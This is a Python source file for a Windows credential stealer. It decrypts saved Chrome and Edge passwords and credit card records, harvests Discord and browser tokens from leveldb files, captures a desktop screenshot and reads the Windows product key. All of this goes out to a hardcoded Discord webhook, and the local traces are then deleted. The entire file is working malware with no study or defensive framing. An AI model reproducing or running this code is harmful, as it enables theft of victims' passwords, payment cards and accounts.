import os
dir_path = os.path.dirname(os.path.realpath(__file__))

import subprocess
subprocess.call(['requirements.bat', '-1'], shell=True)


import sys, os, re, json, ctypes, shutil, base64, sqlite3, zipfile, subprocess
import cryptography
if sys.platform.startswith('linux'):
       exit()
    
else:
    pass


from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend



from dhooks import Webhook, File, Embed, Webhook
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
from json import loads, dumps
from base64 import b64decode
from shutil import copyfile
from PIL import ImageGrab
from sys import argv

# class a:
#     def __init__(self):
#         print("a")
#     def test_func(self):
#         print("mmmmmm")
# import os,re
# def sniff(path):
#     path += '\\Local Storage\\leveldb'

#     tokens = []

#     for file_name in os.listdir(path):
#         if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
#             continue

#         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
#             for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
#                 for token in re.findall(regex, line):
#                     tokens.append(token)
#     return tokens
# sniff("C:\\Users\\User\\AppData\\Roaming\\Discord")
# print("we ends")
# m = a()
# a.test_func()
webhID = "813161098970529802"
webhAT = "Bf3DzaLJJIHoiQuFs9bPECyiAr_Eqmf6b_TqHmAAkvbSw2KSYUIaDJ0R2b92Wt79gyUV"

http = "https"
disc = "discord"
webh = "webhooks"
appl = "api"
server = f"{http}://{disc}.com/{appl}/{webh}/{webhID}/{webhAT}"
hook = Webhook(f"{server}")


# VARIABLES
APP_DATA_PATH = os.environ['LOCALAPPDATA']
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
NONCE_BYTE_SIZE = 12


def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)


def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)


def rcipher(key):
    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
    return cipher


def dpapi(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result


def localdata():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]


def decryptions(encrypted_txt):
    encoded_key = localdata()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)


class chromepassword:
    def __init__(self):
        self.passwordList = []


    def chromedb(self):
        _full_path = os.path.join(APP_DATA_PATH, DB_PATH)
        _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)

    def pwsd(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = 'HOST: %s\nNAME: %s\nVALUE: %s\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)


    def cdecrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            pass


    def saved(self):
        with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as f:
            f.writelines(self.passwordList)


if __name__ == "__main__":
    main = chromepassword()
    try:
        main.chromedb()
    except:
        pass
    main.saved()


# DESKTOP SCREENSHOT :
screen = ImageGrab.grab()
screen.save(os.getenv('ProgramData') + r'\desktop.jpg')
screen = open(r'C:\ProgramData\desktop.jpg', 'rb')
screen.close()
screenshot = File(r'C:\ProgramData\desktop.jpg')


# PASSWORDS > .ZIP :
zname = r'C:\ProgramData\passwords.zip'
newzip = zipfile.ZipFile(zname, 'w')
newzip.write(r'C:\ProgramData\passwords.txt')
newzip.write(r'C:\ProgramData\desktop.jpg')
newzip.close()
passwords = File(r'C:\ProgramData\passwords.zip')


# SEND INFORMATION > REMOVE EVIDENCE :
hook.send("desktop :", file=screenshot)
hook.send("passwords :", file=passwords)
os.remove(r'C:\ProgramData\passwords.txt')
os.remove(r'C:\ProgramData\desktop.jpg')
os.remove(r'C:\ProgramData\passwords.zip')


# GOOGLE CHROME | CREDIT-CARDS :
def master():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
                  "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except:
        pass
    
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = ctypes.windll.crypt32.CryptUnprotectData(
        (master_key, None, None, None, 0)[1])
    return master_key


def dpayload(cipher, payload):
    return cipher.decrypt(payload)


def gcipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def dpassword(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = gcipher(master_key, iv)
        decrypted_pass = dpayload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except:
        pass


def creditsteal():
    master_key = master()
    login_db = os.environ['USERPROFILE'] + os.sep + \
        r'AppData\Local\Google\Chrome\User Data\default\Web Data'
    shutil.copy2(login_db,
                 "CCvault.db")
    conn = sqlite3.connect("CCvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT * FROM credit_cards")
        for r in cursor.fetchall():
            username = r[1]
            encrypted_password = r[4]
            decrypted_password = dpassword(
                encrypted_password, master_key)
            expire_mon = r[2]
            expire_year = r[3]
            hook.send(f"CARD-NAME: " + username + "\nNUMBER: " + decrypted_password + "\nEXPIRY M: " +
                      str(expire_mon) + "\nEXPIRY Y: " + str(expire_year) + "\n" + "*" * 10 + "\n")
    except:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove("CCvault.db")
    except:
        pass


# MICROSOFT EDGE | PASSWORD & CREDIT-CARDS :
def passwordsteal():
    master_key = master()
    login_db = os.environ['USERPROFILE'] + os.sep + \
        r'\AppData\Local\Microsoft\Edge\User Data\Profile 1\Login Data'
    try:
        shutil.copy2(login_db, "Loginvault.db")
    except:
        pass
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute(
            "SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = dpassword(
                encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                hook.send(f"URL: " + url + "\nUSER: " + username +
                          "\nPASSWORD: " + decrypted_password + "\n" + "*" * 10 + "\n")
    except:
        pass

    cursor.close()
    conn.close()


def creditsteals():
    master_key = master()
    login_db = os.environ['USERPROFILE'] + os.sep + \
        r'AppData\Local\Microsoft\Edge\User Data\Profile 1\Login Data'
    try:
        shutil.copy2(login_db, "CCvault.db")
    except:
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        conn = sqlite3.connect("CCvault.db")
        cursor = conn.cursor()

    try:
        cursor.execute("SELECT * FROM credit_cards")
        for r in cursor.fetchall():
            username = r[1]
            encrypted_password = r[4]
            decrypted_password = dpassword(
                encrypted_password, master_key)
            expire_mon = r[2]
            expire_year = r[3]
            hook.send(f"CARD-NAME: " + username + "\nNUMBER: " + decrypted_password + "\nEXPIRY M: " +
                      str(expire_mon) + "\nEXPIRY Y: " + str(expire_year) + "\n" + "*" * 10 + "\n")
    except:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove("CCvault.db")
    except:
        pass

def sniff(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
            break
    return tokens


def tokensteal():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone'

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = sniff(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            pass

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(server, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

# WINDOW'S PRODUCT KEY :
def windows():
    try:
        usr = os.getenv("UserName")
        keys = subprocess.check_output(
            'wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
        types = subprocess.check_output(
            'wmic os get Caption').decode().split('\n')[1].strip()

        if keys == '':
            keys = 'unavailable.'
        else:
            pass

        embed = Embed(
            title=f'key :',
            description=f'user : {usr}\ntype : {types}\nkey : {keys}',
            color=0x2f3136
        )
        hook.send(embed=embed)

    except:
        pass


def gotcha():
    while True:
        tokensteal()
        passwordsteal()
        creditsteal()
        creditsteals()
        windows()
        try:
            subprocess.os.system('del Loginvault.db')
        except:
            pass
        break

from os import remove
from sys import argv

##remove(argv[0])


gotcha()
